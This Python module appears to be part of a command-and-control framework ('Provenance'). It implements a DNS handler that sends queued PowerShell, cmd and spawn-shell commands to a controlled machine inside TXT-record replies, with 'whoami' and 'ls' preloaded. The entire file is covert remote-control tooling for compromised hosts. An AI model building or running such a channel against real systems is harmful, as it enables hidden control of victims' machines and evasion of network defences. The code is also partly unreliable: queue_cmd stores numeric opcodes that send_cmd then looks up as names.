import dnslib
from . import ProtocolHandler


@ProtocolHandler.register # Abstract Base Class registration
class DNSHandler():
    """ This represents a machine being controlled by Provenance"""
    RR = {
        "TXT": (dnslib.QTYPE.TXT, dnslib.TXT)
    }
    command_type = {
        "NONE": 0,
        "POWERSHELL_EXECUTE": 1,
        "CMD_EXECUTE": 2,
        "SPAWN_SHELL": 3
    }

    """ Builtin Functions"""
    def __init__(self, ip, port, socket, rrtype="TXT", name=None):
        self.ip = ip
        self.port = port
        self.socket = socket
        self.name = name
        self.record_type = rrtype
        self.latest_request_id = None
        self.queued_commands = [("POWERSHELL_EXECUTE", "whoami"), ("POWERSHELL_EXECUTE", "ls")]
        self.sent_commands = []
    
    def __repr__(self):
        return f"{self.name}{{{self.ip}, {self.record_type}}}"
    

    """ Handler functions """
    def queue_cmd(self, cmd_type, cmd):
        self.queued_commands.append((self.command_type[cmd_type], cmd))


    def handle_request(self, raw_request):
        data = raw_request[0].strip()
        try:
            request = dnslib.DNSRecord.parse(data)
            if request.header.id != self.latest_request_id:
                if request.header.get_opcode() == 0:
                    self.latest_request_id = request.header.id
                    self.send_cmd(request)
        except dnslib.DNSError:
            print("[INFO] Incorrectly formatted DNS Query. Skipping")
    

    def send_cmd(self, request):
        if self.queued_commands:
            opcode, cmd = self.queued_commands.pop()
        else:
            opcode, cmd = ("NONE", "NONE")

        # get the type of record this beacon is ready to receive
        rr_type, rr_constructor = self.RR[self.record_type]
        # Generate skeleton question for packet
        command_packet = request.reply() 
        # Generate the response to the question
        command_packet.add_answer(
            dnslib.RR(
                rname=request.get_q().get_qname(),
                rtype=rr_type,
                rclass=dnslib.CLASS.IN,
                rdata=rr_constructor(f"<{self.command_type[opcode]}>:{cmd}"),
                ttl=1337))
        # send command
        print(f"[INFO] Sending '{cmd}' to {(self.ip, self.port)}")
        self.socket.sendto(command_packet.pack(), (self.ip, self.port))
        self.sent_commands.append((request.header.id, cmd))

